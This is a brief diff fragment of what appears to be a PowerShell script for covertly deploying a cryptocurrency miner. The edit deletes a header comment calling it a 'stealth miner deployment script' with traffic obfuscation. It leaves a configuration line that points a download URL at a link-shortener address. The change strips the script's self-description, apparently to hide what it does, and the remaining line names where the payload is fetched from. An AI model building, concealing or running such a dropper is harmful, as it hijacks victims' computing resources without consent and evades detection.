@@ -1,9 +1,3 @@
-<#
-.NOTES
-  - Hybrid stealth miner deployment script
-  - Implements HTTPS traffic obfuscation
-#>
-
 
 ### === CONFIGURATION ===
 $zipUrl = "http://tiny.cc/thmg001"
